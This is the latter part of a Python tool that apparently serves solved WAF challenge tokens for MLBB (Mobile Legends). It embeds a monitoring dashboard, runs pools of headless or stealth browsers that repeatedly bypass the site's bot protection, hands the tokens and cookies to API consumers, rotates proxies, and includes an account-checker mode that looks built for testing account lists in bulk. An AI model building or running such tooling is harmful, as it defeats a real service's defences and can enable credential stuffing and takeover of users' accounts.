body{background:#111;color:#ccc;font:13px 'Segoe UI',system-ui,sans-serif;padding:16px}
h1{color:#fff;font-size:18px;font-weight:600;margin-bottom:14px;display:flex;align-items:center;gap:8px}
h1 .dot{width:7px;height:7px;background:#4c4;border-radius:50%;animation:blink 2s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
.stats{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:14px}
.s{background:#1a1a1a;border:1px solid #282828;border-radius:8px;padding:12px 16px;flex:1;min-width:120px}
.s .n{font-size:22px;font-weight:700;margin-bottom:2px}
.s .l{font-size:10px;color:#666;text-transform:uppercase;letter-spacing:.5px}
.s.ok .n{color:#4c4}.s.fl .n{color:#e55}.s.pl .n{color:#4bf}.s.rt .n{color:#fb4}.s.sr .n{color:#fff}.s.us .n{color:#c8f}
.row{display:flex;gap:12px;margin-bottom:12px}
.row>div{flex:1;min-width:0}
@media(max-width:700px){.row{flex-direction:column}}
h3{font-size:11px;color:#555;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;font-weight:600}
.box{background:#1a1a1a;border:1px solid #282828;border-radius:8px;overflow:hidden}
.log{height:230px;overflow-y:auto;padding:8px 10px;font:11px monospace;line-height:1.6}
.log::-webkit-scrollbar{width:4px}.log::-webkit-scrollbar-thumb{background:#333;border-radius:2px}
.log .ok{color:#4c4}.log .fl{color:#e55}.log .ts{color:#555}
table{width:100%;border-collapse:collapse;font-size:11px}
th{color:#555;font-size:10px;text-transform:uppercase;letter-spacing:.5px;padding:8px 10px;text-align:left;border-bottom:1px solid #282828;font-weight:600}
td{padding:6px 10px;border-bottom:1px solid #1f1f1f}
.mono{font-family:monospace;font-size:11px}
.tag{display:inline-block;padding:1px 6px;border-radius:4px;font-size:9px;font-weight:600}
.tag-g{background:#1a2e1a;color:#4c4}.tag-r{background:#2e1a1a;color:#e55}.tag-b{background:#1a1a2e;color:#4bf}
.bar{height:3px;background:#222;border-radius:2px;margin-top:3px}.bar>div{height:100%;border-radius:2px}
.empty{text-align:center;padding:16px;color:#444;font-size:11px}
.foot{display:flex;gap:1px;background:#282828;border-radius:8px;overflow:hidden;margin-top:12px}
.foot>div{flex:1;background:#1a1a1a;padding:10px;text-align:center}
.foot .fv{font-size:16px;font-weight:700;color:#fff}.foot .fl2{font-size:10px;color:#555;margin-top:2px}
</style></head><body>
<h1><span class="dot"></span>Solver Monitor</h1>

<div class="stats">
<div class="s ok"><div class="n" id="ok">0</div><div class="l">Solved</div></div>
<div class="s fl"><div class="n" id="fl">0</div><div class="l">Failed</div></div>
<div class="s pl"><div class="n" id="pl">0</div><div class="l">Pool</div></div>
<div class="s rt"><div class="n" id="rt">0</div><div class="l">Rate/min</div></div>
<div class="s sr"><div class="n" id="sr">0%</div><div class="l">Success</div></div>
<div class="s us"><div class="n" id="us">0</div><div class="l">Consumers</div></div>
</div>

<div class="row">
<div><h3>Log</h3><div class="box"><div class="log" id="lg"></div></div></div>
<div><h3>Consumers</h3><div class="box" style="max-height:230px;overflow-y:auto">
<table><thead><tr><th>IP</th><th>Count</th><th>Last</th></tr></thead><tbody id="ct"></tbody></table>
<div class="empty" id="ct-e">-</div></div></div>
</div>

<div class="row">
<div><h3>Token Pool (""" + str(TOKEN_EXPIRY) + """s TTL)</h3><div class="box" style="max-height:180px;overflow-y:auto">
<table><thead><tr><th>Token</th><th>Age</th><th>TTL</th><th></th></tr></thead><tbody id="pa"></tbody></table>
<div class="empty" id="pa-e">empty</div></div></div>
<div><h3>Recent Tokens</h3><div class="box" style="max-height:180px;overflow-y:auto">
<table><thead><tr><th>#</th><th>atoken</th><th>asig</th></tr></thead><tbody id="tk"></tbody></table>
<div class="empty" id="tk-e">-</div></div></div>
</div>

<div class="foot">
<div><div class="fv" id="tc">0</div><div class="fl2">Consumed</div></div>
<div><div class="fv" id="tu">0</div><div class="fl2">Used</div></div>
<div><div class="fv" id="te">60s</div><div class="fl2">Expiry</div></div>
<div><div class="fv" id="up">0s</div><div class="fl2">Uptime</div></div>
</div>

<script>
function fmt(s){if(s<60)return s+'s';if(s<3600)return~~(s/60)+'m';return~~(s/3600)+'h '+~~(s%3600/60)+'m';}
async function poll(){try{
const r=await fetch('/api/monitor?key=""" + MONITOR_KEY + """'),d=await r.json();
document.getElementById('ok').textContent=d.solved;
document.getElementById('fl').textContent=d.failed;
document.getElementById('pl').textContent=d.pool;
document.getElementById('rt').textContent=d.rate;
document.getElementById('sr').textContent=d.success_rate+'%';
document.getElementById('us').textContent=d.unique_consumers||0;
document.getElementById('tc').textContent=d.total_consumed||0;
document.getElementById('tu').textContent=d.used||0;
document.getElementById('te').textContent=(d.token_expiry||60)+'s';
document.getElementById('up').textContent=fmt(d.uptime);
document.getElementById('lg').innerHTML=(d.log||[]).map(e=>'<div class="'+(e.ok?'ok':'fl')+'"><span class="ts">['+e.ts+']</span> '+e.msg+'</div>').join('');
document.getElementById('lg').scrollTop=9e9;
const ct=document.getElementById('ct'),cte=document.getElementById('ct-e');
if(d.consumers&&d.consumers.length){cte.style.display='none';ct.innerHTML=d.consumers.map(c=>'<tr><td class="mono">'+c.ip+'</td><td><span class="tag tag-b">'+c.count+'</span></td><td>'+(c.last===0?'now':c.last+'s')+'</td></tr>').join('');}else{cte.style.display='';ct.innerHTML='';}
const pa=document.getElementById('pa'),pae=document.getElementById('pa-e');
if(d.pool_ages&&d.pool_ages.length){pae.style.display='none';pa.innerHTML=d.pool_ages.map(p=>{const pct=Math.max(0,Math.min(100,p.remaining/(d.token_expiry||60)*100));const cl=pct>50?'#4c4':pct>20?'#fb4':'#e55';return'<tr><td class="mono">'+p.asig+'…</td><td>'+p.age+'s</td><td>'+p.remaining+'s<div class="bar"><div style="width:'+pct+'%;background:'+cl+'"></div></div></td><td>'+(p.remaining>0?'<span class="tag tag-g">ok</span>':'<span class="tag tag-r">exp</span>')+'</td></tr>';}).join('');}else{pae.style.display='';pa.innerHTML='';}
const tk=document.getElementById('tk'),tke=document.getElementById('tk-e');
if(d.recent&&d.recent.length){tke.style.display='none';tk.innerHTML=d.recent.map((t,i)=>'<tr><td>'+(i+1)+'</td><td class="mono">'+(t.u_atoken||'').slice(0,14)+'…</td><td class="mono">'+(t.u_asig||'').slice(0,18)+'…</td></tr>').join('');}else{tke.style.display='';tk.innerHTML='';}
document.title='S:'+d.solved+' P:'+d.pool;
}catch(e){}}
setInterval(poll,1500);poll();
</script></body></html>"""


# ═══════════════════════════════════════════════════════════
#  SOLVER SLOTS
# ═══════════════════════════════════════════════════════════
_solver_slots_started = False
_solver_slots_lock = threading.Lock()


def _run_solver_slots(n, transport='chromium', headless=True):
    global _solver_slots_started
    with _solver_slots_lock:
        if _solver_slots_started:
            return
        _solver_slots_started = True

    os.environ.setdefault('WAF_SESSION_MAX_AGE', str(SESSION_RESET_S))

    try:
        from kontolsolver import WAFSolver
    except Exception as e:
        print(f"  \033[91m✗ cannot import kontolsolver.py: {e}\033[0m", flush=True)
        return

    def _slot(slot_id):
        solver = WAFSolver(transport=transport, headless=headless,
                           browser_id=slot_id + 1)
        solver.server_url = ""
        try:
            if not solver.ensure_session():
                print(f"  \033[91m✗ slot {slot_id}: session start failed\033[0m", flush=True)
                return
        except Exception as e:
            print(f"  \033[91m✗ slot {slot_id}: {e}\033[0m", flush=True)
            return
        print(f"  \033[92m✓ solver slot {slot_id} ready (TTL {SESSION_RESET_S}s)\033[0m", flush=True)
        while True:
            try:
                if not solver.ensure_session():
                    time.sleep(2)
                    continue
                if solver._solve_once(refresh=False):
                    tok, asig = solver.token, solver.asig
                    cookies = solver._waf_cookie_header()
                    if tok and asig:
                        _push_solved_token(tok, asig, cookies=cookies)
                else:
                    time.sleep(0.5)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"  \033[91mslot {slot_id} err: {str(e)[:100]}\033[0m", flush=True)
                try:
                    solver._mark_dead('slot exception')
                except Exception:
                    pass
                time.sleep(2)
        try:
            solver._mark_dead('slot shutdown')
        except Exception:
            pass

    for i in range(max(1, n)):
        t = threading.Thread(target=_slot, args=(i,), daemon=True, name=f"_slot")
        t.start()
        time.sleep(0.3)


def _push_solved_token(tok, asig, cookies=None):
    if not asig:
        return
    if isinstance(cookies, str):
        ck = {}
        for pair in cookies.split(';'):
            pair = pair.strip()
            if '=' in pair:
                k, _, v = pair.partition('=')
                ck[k.strip()] = v.strip()
        cookies = ck
    _register_pool_entry(atoken=tok, asig=asig, cookies=cookies or {},
                         dev=None, sid=None)


def _ask(prompt, default):
    try:
        raw = input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        return default
    return raw if raw else str(default)


def _ask_choice(prompt, options, default_idx):
    print(prompt)
    for i, (label, _) in enumerate(options, 1):
        mark = ' (default)' if i == default_idx else ''
        print(f"   {i}. {label}{mark}")
    try:
        raw = input(f"   Pick (1-{len(options)}): ").strip()
    except (EOFError, KeyboardInterrupt):
        return options[default_idx - 1][1]
    if not raw:
        return options[default_idx - 1][1]
    try:
        idx = int(raw)
        if 1 <= idx <= len(options):
            return options[idx - 1][1]
    except ValueError:
        pass
    return options[default_idx - 1][1]


def _interactive_setup():
    cores = os.cpu_count() or 4
    rec_slots = min(20, max(4, cores * 2))

    print("\n" + "=" * 60)
    print("  🚀 MLBB WAF SOLVER — SETUP")
    print("=" * 60)

    port = int(_ask(f"\n🔌 Port [5555]: ", 5555))
    launch = _ask_choice(
        "\n🧠 Solver mode",
        [("Auto-launch solver slots (recommended)", True),
         ("API only (no solver; external feeder)", False)],
        1)
    slots = 0
    transport = 'chromium'
    headless = True
    if launch:
        slots = int(_ask(f"\n🌐 Solver slots (~1 core each, {cores} cores, rec {rec_slots}) [{rec_slots}]: ", rec_slots))
        transport = _ask_choice(
            "\n🧩 Browser transport",
            [("chromium (works on this machine)", "chromium"),
             ("cloak (stealth)", "cloak")],
            1)
        display = _ask_choice(
            "\n👁️  Display",
            [("Headless (no window)", True),
             ("Visible (watch it solve)", False)],
            1)
        headless = display

    print("\n" + "-" * 60)
    print(f"  Port      : {port}")
    print(f"  Mode      : {'slots x' + str(slots) if launch else 'API only'}")
    print(f"  Session   : {SESSION_RESET_S}s auto-restart")
    if launch:
        print(f"  Transport : {transport}")
        print(f"  Display   : {'headless' if headless else 'visible'}")
    print("-" * 60)

    class A:
        pass
    a = A()
    a.host = '127.0.0.1'
    a.port = port
    a.proxies = 'proxies.txt'
    a.tokens = None
    a.launch = launch
    a.slots = slots
    a.transport = transport
    a.headless = headless
    return a


if __name__ == '__main__':
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument('--port', type=int, default=5555)
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--proxies', default='proxies.txt')
    ap.add_argument('--tokens', default=None)
    ap.add_argument('--launch', action='store_true')
    ap.add_argument('--slots', type=int, default=20)
    ap.add_argument('--transport', default='chromium', choices=['chromium', 'cloak'])
    ap.add_argument('--headless', action='store_true')
    ap.add_argument('--session-ttl', type=int, default=None)
    ap.add_argument('--warm-pages', type=int, default=None)
    ap.add_argument('--solve-timeout', type=int, default=None)
    ap.add_argument('--check-accounts', default=None)
    ap.add_argument('--workers', type=int, default=4)
    ap.add_argument('--retries', type=int, default=3)
    ap.add_argument('--interactive', '-i', action='store_true')
    if len(sys.argv) == 1 or '--interactive' in sys.argv or '-i' in sys.argv:
        args = _interactive_setup()
    else:
        args = ap.parse_args()

    if getattr(args, 'session_ttl', None):
        SESSION_RESET_S = int(args.session_ttl)
        os.environ['WAF_SESSION_MAX_AGE'] = str(SESSION_RESET_S)
        print(f"  \033[96m→ Session TTL override: {SESSION_RESET_S}s\033[0m", flush=True)
    if getattr(args, 'warm_pages', None):
        WARM_SIZE = max(1, int(args.warm_pages))
        os.environ['WAF_WARM_PAGES'] = str(WARM_SIZE)
        print(f"  \033[96m→ Warm pool size: {WARM_SIZE}\033[0m", flush=True)
    if getattr(args, 'solve_timeout', None):
        SOLVE_TIMEOUT_S = max(5, int(args.solve_timeout))
        os.environ['WAF_SOLVE_TIMEOUT'] = str(SOLVE_TIMEOUT_S)
        print(f"  \033[96m→ Solve timeout: {SOLVE_TIMEOUT_S}s\033[0m", flush=True)
    if getattr(args, 'slots', 0) > 20:
        args.slots = 20
        print(f"  \033[93m⚠ Slots capped at 20 max\033[0m", flush=True)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    if getattr(args, 'tokens', None):
        TOKEN_FILE = os.path.abspath(args.tokens)
    else:
        TOKEN_FILE = os.path.join(script_dir, 'tokens.txt')

    print(f"\n  \033[96mWAF SOLVER — Warm-page browser-backed\033[0m")
    print(f"  \033[96mSession cycle: {SESSION_RESET_S}s auto-restart | Warm pool: {WARM_SIZE} | Solve timeout: {SOLVE_TIMEOUT_S}s\033[0m")
    proxy_path = getattr(args, 'proxies', 'proxies.txt')
    if not os.path.isabs(proxy_path):
        proxy_path = os.path.join(script_dir, proxy_path)
    if os.path.exists(proxy_path):
        _load_proxies(proxy_path)
    else:
        print(f"  \033[93m⚠ No proxy file found at '{proxy_path}' — running direct\033[0m", flush=True)

    if not _HAS_BROWSER:
        print(f"  \033[91m✗ cloakbrowser not installed — /api/solve will return 503.\033[0m")
        print(f"  \033[91m  pip install cloakbrowser\033[0m")

    if getattr(args, 'check_accounts', None):
        path = args.check_accounts
        if not os.path.isabs(path):
            path = os.path.join(script_dir, path)
        if not os.path.exists(path):
            print(f"  \033[91m✗ Accounts file not found: {path}\033[0m", flush=True)
            sys.exit(1)
        if not _HAS_BROWSER:
            print(f"  \033[91m✗ cloakbrowser required for account checking\033[0m", flush=True)
            sys.exit(1)
        print(f"  \033[96m→ Account checker: {path} "
              f"(workers={args.workers}, retries={args.retries})\033[0m\n", flush=True)
        run_account_checker(path, workers=args.workers, retries=args.retries)
        sys.exit(0)

    print(f"  Single:  http://localhost:{args.port}/")
    print(f"  Multi:   http://localhost:{args.port}/multi?n=4")
    print(f"  Monitor: http://localhost:{args.port}/monitor?key={MONITOR_KEY}")
    print(f"  Tokens:  {TOKEN_FILE}")
    print(f"  Proxies: {len(PROXIES)} loaded")
    print(f"  API:     POST /api/solve | GET /api/tokens | GET /api/status\n")

    if not getattr(args, 'launch', False):
        _ensure_prefetch_pool()
    if getattr(args, 'launch', False):
        try:
            cores = os.cpu_count() or 4
        except Exception:
            cores = 4
        if args.slots > cores * 3:
            print(f"  \033[93m⚠ {args.slots} slots on {cores} CPUs — may be resource intensive\033[0m")
        print(f"  \033[96m→ Starting {args.slots} solver slot(s) "
              f"({args.transport}, {'headless' if args.headless else 'visible'}) "
              f"— kontolsolver engine, TTL {SESSION_RESET_S}s\033[0m")
        threading.Thread(
            target=_run_solver_slots,
            args=(args.slots, args.transport, args.headless),
            daemon=True,
        ).start()
    app.run(host=args.host, port=args.port, debug=False, threaded=True)
